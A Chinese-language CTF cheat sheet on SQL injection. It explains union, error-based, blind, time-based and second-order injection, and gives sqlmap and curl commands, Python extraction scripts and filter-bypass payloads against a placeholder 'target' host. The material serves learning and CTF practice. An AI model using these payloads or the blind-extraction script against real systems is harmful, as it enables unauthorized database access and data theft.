# SQL 注入

## 原理
SQL 注入的核心不是“能输入单引号”，而是攻击者输入进入了 SQL 语法层，导致数据库把原本的数据参数当成查询结构的一部分解析。最常见的形成方式是后端直接拼接字符串、把用户输入放进 `ORDER BY`/`LIMIT`/`UNION`/`IN` 等结构位置、或者只做了脆弱的黑名单过滤。对 CTF 题来说，真正需要确认的是三件事：一是输入能否改变布尔结果、排序结果、报错结果或执行时延；二是数据库类型与函数族；三是页面是否存在回显位、差异位或可稳定观测的侧信道。MySQL、PostgreSQL、SQLite、MSSQL 的 payload 体系差异很大，先识别栈再开打通常比盲试更快。

在利用链上，SQL 注入通常分成联合查询、报错注入、布尔盲注、时间盲注、堆叠查询和二次注入。联合查询适合直接把库名、表名、字段值打进页面；报错注入适合有异常信息但无稳定回显位的题；布尔与时间盲注适合“页面几乎不变”的情况；二次注入则常出现在注册、留言、资料修改后由后台查询触发。CTF 常把过滤、编码、上下文限制和数据库差异揉在一起，例如只允许数字、过滤空格、拦截 `select`，或者把注入点藏在 Cookie、JSON、Header、导出文件名、GraphQL 变量里。排查时不要只盯着 GET 参数，而应围绕“请求中哪些位置最终进了 SQL”来思考。

## 工具与命令示例
```bash
# 1) 用 order by 探测列数，直到报错为止
sqlmap -u "http://target/item.php?id=1" --technique=U --union-cols=1-10 --batch

# 2) 直接测试联合查询回显位
curl "http://target/item.php?id=-1%20union%20select%201,2,3--+"

# 3) MySQL 环境下枚举当前库名
curl "http://target/item.php?id=-1%20union%20select%201,database(),3--+"

# 4) 枚举所有表名，常用于先找 flag/users/admin 表
curl "http://target/item.php?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+"

# 5) 布尔盲注测试首字符是否大于 m
curl "http://target/item.php?id=1%20and%20ascii(substr((select%20database()),1,1))%3E109--+"

# 6) 时间盲注，观察响应是否延迟 5 秒
curl "http://target/item.php?id=1%20and%20if(substr(database(),1,1)='s',sleep(5),0)--+"

# 7) 带 Cookie 跑 sqlmap，适合注入点在登录后页面
sqlmap -u "http://target/profile?id=1" --cookie="PHPSESSID=abc123" --batch --level=3 --risk=2

# 8) POST/JSON 注入，很多 CTF 会把点藏在 API
sqlmap -u "http://target/api/search" --data='{"kw":"test"}' --headers="Content-Type: application/json" --batch
```

## 常见 CTF 题型
### 题型一：联合查询直接读 flag 表
思路：先用 `order by` 判断列数，再用 `union select` 找回显位，随后读取当前库下可疑表。若页面只显示其中一列，就把 `group_concat()` 放到那个回显位。

```python
import requests
base = "http://target/item.php?id="
# 假设三列、第二列有回显
payload = "-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+"
print(requests.get(base + payload).text)
```

### 题型二：无报错无回显的布尔盲注
思路：页面只有“Welcome”与空白两种差异，说明可用布尔条件逐字猜解。优先爆数据库名或表名，再转向 flag 字段，避免盲打全库。

```python
import requests
import string
url = "http://target/check.php?id=1 and ascii(substr((select database()),{pos},1))={ch}--+"
ans = ""
for pos in range(1, 20):
    for ch in range(32, 127):
        r = requests.get(url.format(pos=pos, ch=ch))
        if "Welcome" in r.text:
            ans += chr(ch)
            print(ans)
            break
    else:
        break
```

### 题型三：过滤空格与关键字的绕过题
思路：CTF 常过滤空格、`union`、`select`、单引号。可先确认数据库是否支持注释替代空格，再用大小写混写、内联注释、十六进制字符串和等价函数替换绕过。

```python
payload = "-1/**/UnIoN/**/SeLeCt/**/1,hex(database()),3--+"
print(payload)
# 若引号被过滤，可用 0x666c6167 替代 'flag'
```

### 题型四：二次注入或排序注入
思路：注册阶段写入恶意用户名，后台管理页拼接查询时触发；或者参数出现在 `order by` 位置，无法直接闭合字符串但能通过表达式控制排序。

```sql
1 asc,(select case when substr((select database()),1,1)='s' then sleep(3) else 0 end)
```

## 绕过与进阶技巧
- **空格过滤**：用 `/**/`、`%0a`、`%09`、括号、函数调用替代空格，例如 `union/**/select`。
- **引号过滤**：MySQL 可用十六进制字符串，例如 `0x666c6167` 代表 `flag`；数字场景尽量走无引号 payload。
- **关键字过滤**：大小写混写、双写、内联注释、分割关键字，如 `SEL/**/ECT`、`UNIunionON`。
- **逗号过滤**：用 `limit 1 offset 0`、子查询、`join`、`regexp` 等方式规避；某些场景可用 `group_concat` 降请求数。
- **无回显**：优先转布尔差异、时间差异、DNS 外带或报错函数；不要死磕联合查询。
- **报错函数**：MySQL 老题常见 `updatexml()`、`extractvalue()`；新版若被禁用，尝试 JSON、GTID、几何函数报错面。
- **结构位注入**：`order by`、`limit`、`into outfile`、`procedure analyse()` 这类位置更考验数据库语法理解，而不是单纯闭合引号。
- **SQLite/PostgreSQL 差异**：SQLite 读表看 `sqlite_master`，PostgreSQL 看 `pg_catalog` 和 `information_schema`；不要套错 payload 体系。
- **二次注入**：留意注册名、备注、地址、导入文件名、工单标题等“先存后查”的字段，触发点往往不在提交处。

## 快速检查清单
- [ ] 单引号、双引号、右括号是否会改变响应、状态码或页面结构
- [ ] `and 1=1` 与 `and 1=2` 是否存在稳定差异
- [ ] `order by N` 是否可用于判断列数
- [ ] 是否存在可用回显位，能否通过 `union select` 直接出数据
- [ ] 参数是否出现在 JSON、Cookie、Header、文件名、GraphQL 变量中
- [ ] 数据库类型是否已识别，函数与系统表是否匹配
- [ ] 无回显时是否测试过布尔盲注、时间盲注、报错注入
- [ ] 是否存在关键字、空格、引号、逗号过滤，可否用编码或注释绕过
- [ ] 是否有二次注入场景，提交与触发页面是否分离
- [ ] 目标是否只需最短路径读出 `flag`，无需无意义全库 dump
